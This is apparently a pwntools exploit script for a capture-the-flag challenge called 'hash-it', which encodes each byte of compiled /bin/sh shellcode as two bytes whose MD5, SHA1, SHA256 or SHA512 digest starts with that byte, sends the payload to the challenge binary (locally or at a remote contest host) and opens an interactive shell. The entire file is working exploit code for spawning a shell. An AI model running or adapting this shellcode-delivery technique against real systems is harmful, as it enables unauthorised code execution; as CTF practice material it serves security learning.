#!/usr/bin/env python3

import hashlib
import itertools
import os

from pwn import *

the_binary = "./challenge"
context.binary = the_binary
elf = context.binary

context.terminal = ["tmux", "splitw", "-v"]

if args.REMOTE:
    io = remote("hash-it-0-m7tt7b7whagjw.shellweplayaga.me", 31337)
    io.sendlineafter(b"Ticket please: ", os.environ["TICKET"].encode())
elif args.STRACE:
    io = process(["strace", "-o" ,"strace.txt", the_binary])
else:
    io = process(the_binary)

if args.GDB:
    gdb.attach(io, f"""
        file {the_binary}

        # shellcode invocation
        pie break 0x1213

        continue
    """)

def find_hash_bytes(target, hash_func):
    for one, two in itertools.product(range(0xff), repeat=2):
        candidate = bytes([one, two])
        if hash_func(candidate).digest()[0] == target:
            return candidate
    else:
        raise ValueError(
            f"Exhausted candidates for target {target} and func {hash_func}"
        )

hash_funcs = [
    hashlib.md5,
    hashlib.sha1,
    hashlib.sha256,
    hashlib.sha512,
]

sc = """
    int3
"""
compiled_sc = asm(shellcraft.sh())

payload = b""
for idx, b in enumerate(compiled_sc):
    payload += find_hash_bytes(b, hash_funcs[idx % 4])

io.send(p32(len(payload), endian="big"))
io.send(payload)

io.interactive()
